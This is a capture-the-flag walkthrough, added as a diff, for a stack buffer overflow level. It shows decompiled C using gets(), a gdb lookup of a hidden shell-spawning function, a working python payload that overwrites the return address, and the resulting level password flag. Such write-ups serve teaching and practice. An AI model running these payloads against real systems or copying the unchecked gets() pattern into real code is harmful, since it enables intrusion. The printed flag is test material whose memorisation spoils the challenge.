@@ -1,0 +1,73 @@
+# Level1 Walkthrough
+
+## Vulnerability Analysis
+
+This level demonstrates a classic **buffer overflow** vulnerability combined with **return address hijacking**.
+
+### Source Code Analysis
+```c
+void run() {
+    write(1, "Good... Wait what?\n", strlen("Good... Wait what?\n"));
+    system("/bin/sh");
+}
+
+void main(void) {
+    char local_50[76];
+
+    gets(local_50);
+    return;
+}
+```
+
+### Key Vulnerabilities
+1. **Unsafe Input Function**: `gets()` has no bounds checking
+2. **Hidden Function**: `run()` function exists but is never called
+3. **No Stack Protection**: No canaries or ASLR enabled
+
+## Exploitation Process
+
+### Step 1: Identify Buffer Size
+- Local buffer: 76 bytes
+- Return address offset: 76 bytes (confirmed via pattern analysis)
+
+### Step 2: Find Target Function Address
+```bash
+gdb ./level1
+(gdb) print &run
+# Output: $1 = (void (*)()) 0x8048444
+```
+
+### Step 3: Craft Exploit Payload
+```bash
+# Payload structure: [76 bytes padding] + [run() address]
+(python -c "import struct; print('A'*76 + struct.pack('<I', 0x8048444))"; cat) | ./level1
+```
+
+### Step 4: Execute and Retrieve Flag
+```bash
+# After gaining shell access:
+cat /home/user/level2/.pass
+# Flag: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+```
+
+## Technical Details
+
+### Attack Vector
+- **Type**: Stack-based buffer overflow
+- **Method**: Return address overwrite
+- **Target**: Redirect execution to `run()` function
+
+### Exploit Mechanics
+1. Fill 76-byte buffer with padding
+2. Overwrite return address with `run()` function address (0x8048444)
+3. When `main()` returns, execution jumps to `run()`
+4. `run()` executes `system("/bin/sh")` providing shell access
+
+### Security Mitigations Bypassed
+- No stack canaries
+- No ASLR (addresses are predictable)
+- No NX bit (though not needed for this exploit)
+
+## Result
+- **Flag**: `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77`
+- **Access Level**: level2 user privileges
